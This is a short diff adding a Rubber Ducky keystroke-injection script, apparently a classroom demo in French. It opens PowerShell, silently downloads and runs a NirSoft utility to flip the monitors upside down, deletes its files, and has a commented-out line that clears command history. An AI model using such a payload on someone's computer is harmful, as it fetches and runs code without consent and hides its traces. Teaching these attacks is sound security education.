@@ -1,0 +1,46 @@
+REM #############################################################
+REM # TITLE                                                     #
+REM # Démo RubberDucky pour le cours 3U4                        #
+REM # ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯    #
+REM # DESCRIPTION                                               #
+REM # Ce script démarre PowerShell et télécharge l'outil        #
+REM # multimonitortool de NirSoft, puis utilise cet outil pour  #
+REM # inverser l'orientation des 2 premiers moniteurs           #
+REM # puis efface ses traces.                                   #
+REM #                                                           #
+REM # Auteurs : Vincent Carrier,                                #
+REM #           Joris Deguet,                                   #
+REM #           Tommy Gagnon-Joyal,                             #
+REM #           David Marsolais                                 #
+REM # Version : 3.0                                             #
+REM #                                                           #
+REM #############################################################
+DELAY 250
+GUI r
+DELAY 250
+REM Démarrage d'une fenêtre PowerShell
+STRING PowerShell
+ENTER
+DELAY 1000
+
+REM Téléchargement du programme
+STRING $ProgressPreference = 'SilentlyContinue'
+ENTER
+
+DELAY 250
+STRING Invoke-WebRequest -Uri 'https://www.nirsoft.net/utils/multimonitortool-x64.zip' -OutFile 'a.zip'
+ENTER
+
+REM Extraction du programme
+STRING expand-archive a.zip;
+
+REM Exécution de l'attaque
+STRING 1..4|%{saps ./a/multimonitortool.exe "/setorientation $_ 180" -wait};
+
+REM Nettoyage
+STRING remove-item a.zip,./a -recurse -force;
+REM STRING clc (get-psreadlineoption).historysavepath;
+REM STRING exit
+
+REM Exécution du script
+ENTER
